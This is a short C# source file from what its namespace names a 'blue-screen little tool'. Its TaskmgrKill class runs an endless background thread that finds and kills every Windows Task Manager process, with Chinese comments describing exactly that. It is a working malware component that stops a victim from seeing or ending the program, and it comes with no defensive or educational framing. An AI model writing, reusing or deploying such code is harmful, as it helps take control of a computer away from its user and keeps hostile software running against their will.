using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace CSharp_蓝屏小工具
{
    public static class TaskmgrKill
    {
        public static void Run()
        {
            Thread thread = new Thread(Kill);
            thread.IsBackground = true;
            thread.Start();
        }

        static void Kill()
        {
            while (true)
            {
                try
                {
                    //获取任务管理器进程句柄
                    Process[] process = Process.GetProcessesByName("Taskmgr");
                    foreach (var item in process)
                    {
                        //关闭任务管理器
                        item.Kill();
                        Thread.Sleep(100);
                    }
                }
                catch
                {

                }
            }
        }
    }
}
